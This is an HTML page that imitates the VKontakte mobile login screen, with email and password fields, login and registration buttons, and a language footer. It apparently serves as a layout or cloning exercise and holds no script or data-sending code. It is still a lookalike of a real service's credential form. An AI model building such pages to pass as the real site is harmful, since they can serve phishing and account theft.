<!DOCTYPE html>
<html lang="ru">
<head>
	<meta charset="UTF-8">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
	<title>Мобильная версия ВКонтакте</title>
</head>
<body>
	<div class="layout">
		<div class="layout__header">

		</div>
		<div class="layout__body">
			<div class="layout__basis">
				<div class="basis">
					<div class="basis__header">
						<a href="/">
							<i class="fab fa-vk"></i>
						</a>
					</div>
					<div class="basis__content">
						<div class="installApp">
							<a href="#" class="installApp__link">
								<div class="installApp__link_wrap">
									<div class="installApp__label">
										<i class="fas fa-mobile-alt"></i>
										Установить приложение <b>ВКонтакте</b>
										<i class="fas fa-chevron-right"></i>
									</div>
								</div>
							</a>
						</div>
						<div class="pcont">
								<div class="PageBlock">
									<div class="form-item">
										<div class="login_header">
											Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
										</div>
										<form action="post">
											<dl class="fi_row">
												<dd>
													<input type="text" class="textfield" name="email" placeholder="Телефон или email">
												</dd>
											</dl>
											<dl class="fi_row">
												<dd>
													<input type="text" class="textfield" name="pass" placeholder="Пароль">
												</dd>
											</dl>
											<div class="fi_row_new">
												<input type="submit" class="button wide_button" value="Войти">
											</div>
											<div class="fi_row">
												<div class="near_btn wide_button login-restore">
													<a href="#">Забыли пароль?</a>
												</div>			
											</div>
											<div class="login_new_user">
												<div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
											</div>
											<div class="fi_row">
												<a href="#" class="button wide_button success">
													Зарегистрироваться
												</a>		
											</div>
											<div class="socials">
												<a href="#" class="social_button">
													<i class="fab fa-facebook-square"></i>
													Войти через Facebook
												</a>
											</div>
										</form>
									</div>
								</div>
							</div>
					</div>
					<div class="basis__footer">
						<div class="pfoot">
							<ul class="footer_menu">
								<li class="fm_row">
									<a href="#" class="fm_item">English</a>
								</li>
								<li class="fm_row">
										<a href="#" class="fm_item">Українська</a>
								</li>
								<li class="fm_row">
										<a href="#" class="fm_item">all languages »</a>
								</li>
							</ul>
							<ul id="footer_menu" class="footer_menu">
									<li class="fm_row">
											<a href="#" class="fm_item">Версия для компьютера</a>
									</li>
							</ul>	
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>		
</body>
</html>
